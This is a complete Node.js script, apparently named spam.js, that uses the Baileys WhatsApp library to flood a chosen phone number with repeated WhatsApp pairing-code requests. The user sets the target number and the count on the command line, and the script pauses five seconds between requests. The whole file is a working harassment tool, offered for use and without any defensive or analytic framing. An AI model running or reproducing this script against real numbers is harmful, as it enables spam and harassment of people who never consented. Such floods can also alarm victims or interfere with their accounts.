const {
    default: makeWASocket,
    useMultiFileAuthState
} = require('@whiskeysockets/baileys');
const Pino = require('pino');
const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const deleteSessionFolder = async () => {
    fs.rmSync('session', { recursive: true, force: true });
}

const connectToWhatsApp = async (targetNumber, spamAmount) => {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const conn = makeWASocket({
        logger: Pino({ level: 'silent' }),
        browser: ['Linux', 'Chrome', ''],
        auth: state,
        defaultQueryTimeoutMs: undefined,
        syncFullHistory: false
    });

    console.log('Spam will start in 3 seconds...');
    await delay(3000);

    try {
        for (let i = 1; i <= spamAmount; i++) {
            try {
                let code = await conn.requestPairingCode(targetNumber);
                code = code?.match(/.{1,4}/g)?.join('-') || code;
                console.log(`${i}. The pairing code has been successfully sent to: ${targetNumber}`);
                if (i < spamAmount) {
                    // Add delay to prevent spamming
                    await delay(5000); // Adjust delay as necessary
                }
            } catch (err) {
                console.log(`Error while requesting pairing code at iteration ${i}: ${err}`);
                // Continue with the next iteration even if there is an error
            }
        }
        console.log('Spam completed. Stopping...');
        deleteSessionFolder();
        process.exit(0);
    } catch (e) {
        console.log('Error during spam operation: ' + e);
    } finally {
        rl.close();
    }

    conn.ev.on('connection.update', (c) => {
        const { connection } = c;
        if (connection === 'close') {
            console.log('Connection closed, trying to reconnect again...');
            connectToWhatsApp(targetNumber, spamAmount);
        }
        if (connection === 'open') {
            console.log('Connected: ' + conn.user.id.split(':')[0]);
        }
    });

    conn.ev.on('creds.update', saveCreds);
}

// Read command-line arguments
const args = process.argv.slice(2);
if (args.length < 2) {
    console.error('Usage: node spam.js <targetNumber> <spamAmount>');
    process.exit(1);
}

const [targetNumber, spamAmountStr] = args;
const spamAmount = parseInt(spamAmountStr);

if (isNaN(spamAmount) || spamAmount < 1) {
    console.error('Invalid spam amount. It must be a number greater than 0.');
    process.exit(1);
}

// Start the connection with the provided arguments
connectToWhatsApp(targetNumber, spamAmount);
